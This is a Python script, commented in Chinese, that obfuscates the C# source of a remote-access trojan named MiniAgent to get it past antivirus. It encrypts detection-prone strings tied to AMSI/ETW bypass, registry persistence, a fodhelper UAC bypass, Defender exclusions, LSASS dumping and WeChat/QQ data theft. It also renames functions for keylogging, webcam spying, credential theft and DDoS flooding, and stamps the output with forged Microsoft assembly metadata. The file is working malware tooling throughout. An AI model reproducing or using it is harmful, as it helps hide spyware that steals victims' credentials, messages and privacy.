#!/usr/bin/env python3
"""
MiniAgent.cs 源码混淆器 v2 — 精准定向混淆
只加密 AV 敏感字符串，不动格式化字符串和普通逻辑
"""

import re, os, random, string, base64, shutil

SRC = os.path.join(os.path.dirname(os.path.abspath(__file__)), "MiniAgent.cs")
DST = os.path.join(os.path.dirname(os.path.abspath(__file__)), "MiniAgent_obf.cs")

# ── XOR 密钥 ──
XOR_KEY = bytes(random.randint(1, 255) for _ in range(16))

def xor_enc(s):
    data = s.encode("utf-8")
    enc = bytes(b ^ XOR_KEY[i % len(XOR_KEY)] for i, b in enumerate(data))
    return base64.b64encode(enc).decode("ascii")

def gen_id(n=8):
    return "_" + "".join(random.choices(string.ascii_letters, k=n))

# ══════════════════════════════════════════
#  1. 敏感字符串列表 — 这些会触发 AV 签名
# ══════════════════════════════════════════
SENSITIVE_STRINGS = [
    # Evasion — AMSI/ETW 相关
    "amsi.dll",
    "AmsiScanBuffer",
    "ntdll.dll",
    "EtwEventWrite",
    # 持久化 — 注册表/任务计划
    r"SOFTWARE\Microsoft\Windows\CurrentVersion\Run",
    r"SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon",
    "UserInitMprLogonScript",
    "WinNetCfgSvc_",
    "NetCfg_",
    "schtasks.exe",
    # 进程名
    "powershell.exe",
    "cmd.exe",
    "rundll32.exe",
    "taskmgr.exe",
    "explorer.exe",
    # 动态 API 名（间接调用的）
    "VirtualProtect",
    "GetModuleHandleA",
    # 可疑头部
    "X-Agent-OS",
    # Agent 标识 — 跳过 const 字段
    # "13.1.0-cs",
    # Mutex
    r"Global\MiniAgentV2_",
    # UAC bypass
    "fodhelper.exe",
    "DelegateExecute",
    r"Software\Classes\ms-settings\shell\open\command",
    r"Software\Classes\ms-settings\shell",
    # Defender 排除
    "Add-MpPreference",
    "-ExclusionPath",
    "-ExclusionProcess",
    "wscript.exe",
    # 凭据窃取
    "comsvcs.dll",
    "MiniDump",
    "SeDebugPrivilege",
    "SeBackupPrivilege",
    "Login Data",
    "Local State",
    "encrypted_key",
    # 微信/QQ 数据提取
    "WeChat",
    "WeChatWin.dll",
    "WeChat Files",
    "Tencent Files",
    "Tencent",
    "QQNT",
    "wrapper.node",
    "qqnt.node",
    "passphrase",
    "MicroMsg.db",
    "ChatMsg.db",
    "Msg3.0.db",
    "nt_db",
    "nt_qq",
    "SQLite format 3",
    # 浏览器历史
    "Chrome",
    "Edge",
    "Brave",
    "History",
    "Bookmarks",
    "Favorites",
    r"Software\Microsoft\Internet Explorer\TypedURLs",
    # 摄像头 — avicap32.dll/capCreateCaptureWindowA 在 DllImport 特性中使用，不能加密
]

# ══════════════════════════════════════════
#  2. 标识符重命名映射
# ══════════════════════════════════════════
ID_MAP = {}
def add_id(old, new=None):
    ID_MAP[old] = new or gen_id(max(6, len(old)))

# namespace / classes
add_id("MiniAgent")
add_id("Entry")
add_id("Agent")
add_id("PtySession")
add_id("ScreenSession")
add_id("Evasion")
add_id("FilelessPersistence")

# 必须保留: Entry.Run (PowerShell stager 反射调用)
# 所以 Run 不改名，但 Entry 类改名了，stager 需要更新

# methods — Evasion
add_id("HardwareBpBypass")
add_id("VehHandler")
add_id("ApplyBp")
add_id("SetBpOnThread")
add_id("BlindETW")
add_id("IsAdmin")
add_id("RunElevated")
add_id("AddDefenderExclusion")
add_id("IsSandbox")

# methods — Agent
for m in ["RunForever","AutoRegister","WsLoop","WsSession","PingLoop",
          "HandleMessage","HandleExec","HandlePtyStart","HandlePtyInput",
          "HandlePtyClose","HandleQuickCmd","HandleScreenStart","HandleScreenStop",
          "HandleMemExec","HandleNetScan","HandleLateralDeploy",
          "HandleCredDump","DumpCredentialManager","DumpWiFiPasswords",
          "DumpBrowserCreds","DumpSAMHashes","DumpLSASS","DPAPIDecrypt",
          "ParseLoginDataSqlite","AesGcmDecrypt","EnablePrivilege","RunQuiet",
          "HandleFileBrowse","HandleFileDownload","HandleWebcamSnap","HandleSelfUpdate",
          "HandleWebcamStart","HandleWebcamStop","WebcamStreamLoop",
          "DsInitGraph","DsCleanupGraph","DsGrabJpeg","DsVT","DsRel",
          "HandleProcessList","HandleProcessKill","HandleServiceList","HandleServiceControl",
          "HandleKeylogStart","HandleKeylogStop","HandleKeylogDump","KeylogWorker","TranslateKey",
          "HandleBrowserHistory","HandleNetstat","HandleSoftwareList",
          "DumpWeChatInfo","DumpQQInfo","ExtractWeChatKeyFromMemory","ValidateWeChatKey",
          "TryValidateSQLCipher3","TryValidateSQLCipher4","DecryptSQLCipherDb","VerifyPageHMAC",
          "ParseWeChatMessages","ParseWeChatContacts","TryExtractNTQQKey","ExtractNTQQKeyFromMemory",
          "ParseNTQQMessages","ParseChromiumHistory","ParseHistorySqlite","ExtractBookmarkUrls","CollectFavorites",
          "ReportLoop","GatherMetrics",
          "SendAgentMsg","WsSend","WsSendBinary","VerifySignature","HttpPost",
          "JsonEscape","JsonGetString","JsonGetRaw","RunHidden","CaptureLoop",
          "WriteInput","Install",
          "HandleStressStart","HandleStressStop","RunStress","BuildStressProgress",
          "StressHttpFlood","StressTcpFlood","StressUdpFlood","StressSlowloris",
          "StressBandwidth","StressHttpsFlood","StressH2Reset","StressWsFlood",
          "WriteH2Frame","BuildH2Headers","HpackWriteString",
          "StressUpdateMinMax","StressRandStr","StressRandIP"]:
    add_id(m)

# fields
for f in ["_serverUrl","_token","_signKey","_reportUrl","_wsUrl","_writeLock","_selfUpdating",
          "_webcamStreaming","_webcamThread",
          "_keylogRunning","_keylogThread","_keylogLock","_keylogBuffer",
          "_ptySessions","_screenSessions","_onOutput","_onExit","_onFrame",
          "_proc","_stdin","_disposed","_stopped","_fps","_quality","_scale",
          "_bpAmsi","_vehDelegate","_vp",
          "_stressCts","_stressRunning","_stressLock",
          "_stressUAs","_stressReferers","_stressLangs","_stressSecChUa",
          "_stressPaths","_stressCookieNames","_stressRng","_httpsFloodWorkerIdx"]:
    add_id(f)


# ══════════════════════════════════════════
#  混淆函数
# ══════════════════════════════════════════

def strip_comments(code):
    """移除注释，但不动字符串内的 // 和 /* */"""
    # 先用状态机移除块注释（跳过字符串内的 /* */）
    result = []
    i = 0
    in_str = False
    in_verbatim = False
    in_block = False
    while i < len(code):
        if in_block:
            if code[i:i+2] == '*/':
                in_block = False; i += 2; continue
            i += 1; continue
        if not in_str and not in_verbatim:
            if code[i:i+2] == '@"':
                result.append(code[i:i+2]); i += 2; in_verbatim = True; continue
            if code[i] == '"':
                result.append(code[i]); i += 1; in_str = True; continue
            if code[i:i+2] == '/*':
                in_block = True; i += 2; continue
            result.append(code[i]); i += 1
        elif in_str:
            if code[i] == '\\' and i+1 < len(code):
                result.append(code[i:i+2]); i += 2; continue
            if code[i] == '"': in_str = False
            result.append(code[i]); i += 1
        elif in_verbatim:
            if code[i] == '"':
                if i+1 < len(code) and code[i+1] == '"':
                    result.append('""'); i += 2; continue
                in_verbatim = False
            result.append(code[i]); i += 1
    code = ''.join(result)
    code = re.sub(r'^\s*///.*$', '', code, flags=re.MULTILINE)
    # 逐行处理 // 注释，跳过字符串内的
    lines = code.split('\n')
    result = []
    for line in lines:
        new_line = []
        in_str = False
        in_verbatim = False
        i = 0
        while i < len(line):
            if not in_str and not in_verbatim:
                if line[i:i+2] == '@"':
                    new_line.append(line[i:i+2]); i += 2; in_verbatim = True; continue
                if line[i] == '"':
                    new_line.append(line[i]); i += 1; in_str = True; continue
                if line[i:i+2] == '//':
                    break  # 注释开始，丢弃后续
                new_line.append(line[i]); i += 1
            elif in_str:
                if line[i] == '\\': new_line.append(line[i:i+2]); i += 2; continue
                if line[i] == '"': in_str = False
                new_line.append(line[i]); i += 1
            elif in_verbatim:
                if line[i] == '"':
                    if i+1 < len(line) and line[i+1] == '"':
                        new_line.append('""'); i += 2; continue
                    in_verbatim = False
                new_line.append(line[i]); i += 1
        result.append(''.join(new_line))
    code = '\n'.join(result)
    code = re.sub(r'\n{3,}', '\n\n', code)
    return code

def encrypt_sensitive_strings(code):
    """只替换敏感字符串为 _Q._S() 调用"""
    for s in sorted(SENSITIVE_STRINGS, key=len, reverse=True):
        # 在 C# 中这个字符串可能出现为 "xxx" 或 @"xxx"
        # 普通字符串中反斜杠需要双写: SOFTWARE\\Microsoft
        cs_escaped = s.replace("\\", "\\\\")
        
        # 替换 "sensitive_string" -> _Q._S("encrypted")
        old_normal = '"' + cs_escaped + '"'
        old_verbatim = '@"' + s + '"'
        replacement = '_Q._S("' + xor_enc(s) + '")'
        
        code = code.replace(old_normal, replacement)
        code = code.replace(old_verbatim, replacement)
    return code

def obfuscate_byte_arrays(code):
    """混淆硬件断点相关的魔术数字（已改为硬件断点方案，无需 patch 字节）"""
    return code

def rename_identifiers(code):
    sorted_ids = sorted(ID_MAP.items(), key=lambda x: len(x[0]), reverse=True)
    for old, new in sorted_ids:
        code = re.sub(r'\b' + re.escape(old) + r'\b', new, code)
    return code

def inject_decryptor(code):
    """在 namespace 内注入字符串解密类"""
    ns = ID_MAP.get("MiniAgent", "MiniAgent")
    key_hex = ", ".join(f"0x{b:02X}" for b in XOR_KEY)
    
    decryptor = f"""
    internal static class _Q
    {{
        static readonly byte[] _k = new byte[] {{ {key_hex} }};
        internal static string _S(string b)
        {{
            byte[] d = System.Convert.FromBase64String(b);
            byte[] r = new byte[d.Length];
            for (int i = 0; i < d.Length; i++) r[i] = (byte)(d[i] ^ _k[i % _k.Length]);
            return System.Text.Encoding.UTF8.GetString(r);
        }}
    }}
"""
    # 在 namespace { 后注入
    pattern = r'(namespace\s+' + re.escape(ns) + r'\s*\{)'
    code = re.sub(pattern, r'\1' + decryptor, code)
    return code


def inject_assembly_attributes(code):
    """在文件顶部注入伪装的 Assembly 属性，覆盖 PE 元数据"""
    # 随机选择一个看起来正常的伪装身份
    covers = [
        ("Microsoft.Windows.Networking.Config", "Windows Network Configuration Helper",
         "Microsoft Corporation", "10.0.19041.1"),
        ("System.Runtime.Extensions", "System Runtime Extensions",
         "Microsoft Corporation", "4.6.28619.1"),
        ("WinFormsBridge", "Windows Forms Compatibility Bridge",
         ".NET Foundation", "6.0.2.0"),
    ]
    name, desc, company, ver = random.choice(covers)
    
    attrs = f"""[assembly: System.Reflection.AssemblyTitle(\"{desc}\")]
[assembly: System.Reflection.AssemblyDescription(\"{desc}\")]
[assembly: System.Reflection.AssemblyCompany(\"{company}\")]
[assembly: System.Reflection.AssemblyProduct(\"{name}\")]
[assembly: System.Reflection.AssemblyCopyright(\"Copyright (c) {company} 2024\")]
[assembly: System.Reflection.AssemblyVersion(\"{ver}\")]
[assembly: System.Reflection.AssemblyFileVersion(\"{ver}\")]
"""
    # 插入在 using 块之后、namespace 之前
    ns = ID_MAP.get("MiniAgent", "MiniAgent")
    idx = code.find("namespace " + ns)
    if idx > 0:
        code = code[:idx] + attrs + "\n" + code[idx:]
    return code, name


# ══════════════════════════════════════════
#  主流程
# ══════════════════════════════════════════

def main():
    print(f"[*] Reading {SRC}")
    with open(SRC, "r", encoding="utf-8") as f:
        code = f.read()
    
    print(f"[1] Stripping comments...")
    code = strip_comments(code)
    
    print(f"[2] Obfuscating byte arrays...")
    code = obfuscate_byte_arrays(code)
    
    print(f"[3] Encrypting {len(SENSITIVE_STRINGS)} sensitive strings...")
    code = encrypt_sensitive_strings(code)
    
    print(f"[4] Renaming {len(ID_MAP)} identifiers...")
    code = rename_identifiers(code)
    
    print(f"[5] Injecting decryptor class...")
    code = inject_decryptor(code)
    
    print(f"[6] Injecting fake assembly attributes...")
    code, cover_name = inject_assembly_attributes(code)
    
    code = re.sub(r'\n{3,}', '\n\n', code)
    
    with open(DST, "w", encoding="utf-8") as f:
        f.write(code)
    
    ns = ID_MAP["MiniAgent"]
    entry = ID_MAP["Entry"]
    print(f"\n[+] Output: {DST}")
    print(f"[+] XOR key: {XOR_KEY.hex()}")
    print(f"[+] Namespace: MiniAgent -> {ns}")
    print(f"[+] Entry: Entry -> {entry}")
    print(f"[+] Cover identity: {cover_name}")
    print(f"[+] Stager 需要更新: GetType(\"{ns}.{entry}\") / GetMethod(\"Run\")")
    
    # 保存映射（两份：详细映射 + 服务端专用）
    with open(DST.replace("_obf.cs", "_mapping.txt"), "w") as f:
        f.write(f"NAMESPACE={ns}\n")
        f.write(f"ENTRY_CLASS={entry}\n")
        f.write(f"COVER_NAME={cover_name}\n")
        for old, new in sorted(ID_MAP.items()):
            f.write(f"{old} -> {new}\n")
    # 服务端 stager 读取的映射文件（文件名必须是 obf_mapping.txt）
    import os
    with open(os.path.join(os.path.dirname(DST), "obf_mapping.txt"), "w") as f:
        f.write(f"NAMESPACE={ns}\n")
        f.write(f"ENTRY_CLASS={entry}\n")
    
    print(f"[+] Done!")

if __name__ == "__main__":
    main()
